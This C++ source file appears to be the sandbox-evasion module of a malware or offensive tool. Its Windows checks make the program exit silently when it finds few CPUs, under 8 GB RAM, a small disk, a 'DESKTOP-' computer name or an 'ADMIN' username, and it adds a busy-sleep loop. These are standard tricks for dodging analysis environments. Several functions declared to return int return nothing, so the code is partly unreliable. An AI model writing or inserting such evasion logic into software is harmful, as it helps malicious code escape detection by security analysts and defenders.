#include "../includes/evasion.h"
#include <iostream>
#include <windows.h>

int busySleep() {
  for (int a { 0 }, b { 0 }, c { 0 }; a <= 60; a++) {
    b++;
    c++;
  }
}

int cpuCount() {
  SYSTEM_INFO systemInfo;
  GetSystemInfo( &systemInfo );

  DWORD cpuCount = systemInfo.dwNumberOfProcessors;

  if (cpuCount < 2) {
    std::exit(EXIT_SUCCESS);
  }
}

int ramSize() {
  MEMORYSTATUSEX memoryInfo;
  memoryInfo.dwLength = sizeof( memoryInfo );
  GlobalMemoryStatusEx( &memoryInfo );
  DWORD ram_size = memoryInfo.ullTotalPhys / 1024 / 1024;

  if (ram_size < 8192) {
    std::exit(EXIT_SUCCESS);
  }
}

int hddSize() {
  HANDLE        device_handle = 
    CreateFileW(
    L"\\\\.\\Physicaldrive0", 
    0,
    FILE_SHARE_READ | FILE_SHARE_WRITE, 
    NULL, 
    OPEN_EXISTING,
    0, 
    NULL
  );

  DISK_GEOMETRY disk_geometry;
  DWORD         bytes_returned;

  if (device_handle == INVALID_HANDLE_VALUE) {
    std::cout << "Error G1" << GetLastError() << '\n';
  }

  if (!DeviceIoControl(
    device_handle,
    IOCTL_DISK_GET_DRIVE_GEOMETRY,
    NULL,
    0,
    &disk_geometry,
    sizeof(disk_geometry),
    &bytes_returned,
    (LPOVERLAPPED)NULL
  ))

  {
    std::cout << "Error G2" << GetLastError() << '\n';
  }

  DWORD disk_size = disk_geometry.Cylinders.QuadPart * (ULONG)disk_geometry.TracksPerCylinder * (ULONG)disk_geometry.SectorsPerTrack * (ULONG)disk_geometry.BytesPerSector / 1024 / 1024 / 1024;

  if (disk_size < 180) {
    std::exit(EXIT_SUCCESS);
  }
}

int computerName() {
  DWORD  computer_name_length = MAX_COMPUTERNAME_LENGTH + 1;
  wchar_t computername[MAX_COMPUTERNAME_LENGTH + 1];
  
  if (!GetComputerNameW(computername, &computer_name_length)) {
    std::cout << "Error G3" << GetLastError() << '\n';

  }

  CharUpperW(computername);

  if (wcsstr(computername, L"DESKTOP-")) {
    std::exit(EXIT_SUCCESS);
  }

  return EXIT_SUCCESS;
}

int username() {
  DWORD   username_length = 256;
  wchar_t username[username_length + 1];

  if (!GetUserNameW(username, &username_length)) {
    std::cout << "Error G4" << GetLastError() << '\n';
  }

  CharUpperW(username);

  if (wcsstr(username, L"ADMIN")) {
    std::exit(EXIT_SUCCESS);
  }
}
